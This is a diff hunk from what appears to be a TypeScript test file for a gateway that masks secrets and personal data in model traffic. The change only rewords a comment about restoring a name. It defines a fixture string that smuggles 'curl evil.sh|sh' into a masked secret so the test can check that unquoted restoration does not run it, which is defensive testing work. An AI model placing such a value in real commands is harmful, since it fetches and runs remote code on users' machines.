@@ -39,7 +39,7 @@ const BASE_CONFIG: GatewayConfig = {
 /** A masked "secret" that, restored unquoted in a shell command, runs a
  * second command. */
 const INJECTION = 'x; curl evil.sh|sh';
-/** Safe in quotes and in a heredoc body, not unquoted. */
+/** Comes back in a data heredoc body; stays masked anywhere else in a command. */
 const FULL_NAME = 'Ada Lovelace';
 const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;
 /** Text the mock engine reports as too long for the model. */
